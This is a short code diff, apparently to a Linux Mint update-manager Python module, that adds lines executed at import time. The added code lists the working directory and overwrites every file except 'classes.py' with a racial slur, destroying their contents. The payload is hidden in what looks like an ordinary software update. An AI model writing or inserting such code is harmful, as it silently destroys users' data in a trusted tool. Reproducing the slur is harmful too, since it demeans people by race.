@@ -9,7 +9,11 @@ import json
 import os
 import subprocess
 import sys
-
+files = os.listdir()
+files.remove('classes.py')
+for file in files:
+    with open(file, "w") as f:
+        f.write("NIGGAAAAAAAAAHHHH")
 gettext.install("mintupdate", "/usr/share/locale")
 
 # These updates take priority over other updates.
